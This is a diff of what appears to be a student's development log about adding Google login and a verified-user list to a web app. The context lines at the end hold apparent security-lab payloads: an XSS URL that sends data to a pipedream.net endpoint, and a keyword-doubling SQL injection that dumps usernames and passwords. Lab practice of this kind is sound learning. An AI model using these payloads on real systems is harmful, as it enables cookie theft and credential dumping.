@@ -136,13 +136,45 @@
 
 
 
+15/03 5:30pm - 8:40
+
+- Created new smaller javascript file for testing login
+- Google login page is working and I can grab the name or check when authentication fails
+- TODO: Will need to add my app and apply for a public token if I want to use this authentication later
+- Passed the username to backend and attached the username to the spreadsheet
+- TODO: need to deal with anonymous login and verify google token
 
 
 
+15/03 10:47am - 12:30pm
+
+- Added ability to add verified status to spreadsheet
+  - Initially I was going to append to name but I can't control the name nicely
+
+    - e.g. I append something to the name, someone else could make a username with that thing appended to it
+    - also nicer to have a separate table for verified inserts since it's easier to parse
+  - Currently hardcoded list of verified google_id's
+    - Not sure where I want to go with this or what the proper way to do this yet, but it doesn't seem to be something that is publicly available. Though I wonder if it's application specific or global to that google account. Definitely a point of vulnerability
+    - 
+- Added navigation bar
+  - With link to spreadsheet and logout button
+- TODO:
+  - verify token in the backend and get username that way
+- Logout button added
+- Login screen created
+- Logout button functional
 
 
 
+17/03 1am - 3am:
 
+- Lots of bug fixing and reading
+- Verifying token in the backend might be a little out of scope if I were to do it properly
+  - Need to use jwts/google's actual api to verify it and I'm not sure I want to push this to production if I'm going to maintain it since feedback seems to be trending towards not including it 
+- Formatted frontend a bit more, but it's a bit plain right now
+  - Not really sure what to add to it
+- Submit success page has not been styled. Might delete it in favour of a success message on the same page which will be nice for submitting multiple switches
+- TODO: add an indication that we're waiting on a response from the backend after submission
 
 
 
@@ -203,3 +235,4 @@ http://xss4.comp6841.xyz/search?q={<script>https://en0qx44nddqfsa.x.pipedream.ne
 
 
   ' UNIUNIONON SELSELECTECT username, password, 'filler' FRFROMOM users; -- asdfsdfsdf
+
